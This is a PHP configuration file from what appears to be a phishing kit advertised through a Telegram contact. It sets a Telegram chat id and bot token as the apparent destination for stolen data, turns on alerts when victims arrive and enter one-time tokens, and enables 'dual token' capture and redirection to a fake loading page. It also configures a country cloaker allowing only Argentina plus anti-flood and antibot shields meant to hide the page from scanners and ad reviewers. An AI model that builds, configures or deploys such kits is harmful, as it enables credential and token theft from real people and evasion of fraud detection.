<?php
/**
###############################################
# Soporte https://t.me/eyezcorp   			  #
# ID: E46		 					   	  	  #
###############################################
**/

	// Telegram
	$id = '-4065265842';    // chat id      
	$key = '5343849853:AAHtRzsJWdYc4YR2eY4cv7EjB6FAx6mfNX4'; // token
	

	// Configuración dinámica
	$alert = true; // true para activar alerta de cliente nuevo | false para desactivar
	$alertx = true; // true para activar aviso de cliente ingresando token | false para desactivar
	$dual = true; // true para activar dual token | false para desactivar
	$out = "../cargando.php?update=token";	// página final de redirección
	$timer = 15; // segundos que dura el temporizador el cargar la siguiente página

	// CLOACKER CONFIG
	$comprobate_country = true;		// true para activar el cloacker | false para desactivar
	$countries_allowed = ["AR"];	//	pais permitido para el cloacker
		
	
	//	Antiflood System 
	$blocker = true;		// true para activar antiflood | false para desactivar
		
	
	//	ANTIBOTS EYEZGUARD v1.3
	$EYEZ = false;		// true para activar antibots | NO SE RECOMIENDA USAR ANTIBOTS EN CAMPAÑAS DE GOOGLE ADS
	//	para ver, activar o desactivar algún escudo del guardian revisar en su config ./guardian/config,ini
	/**
	 * 	// Default EYEZGUARD config - 'on' encendido | 'off' apagado
	anti_ua='on'			// ANTI USER AGENT
	anti_hn='on'    		// ANTI HOSTNAME
	anti_isp='on'			// ANTI ISP
	anti_fingerprints='off'	// ANTI FINGERPRINTS
	anti_proxy='off'		// ANTI PROXY
	 * 
	 */
?>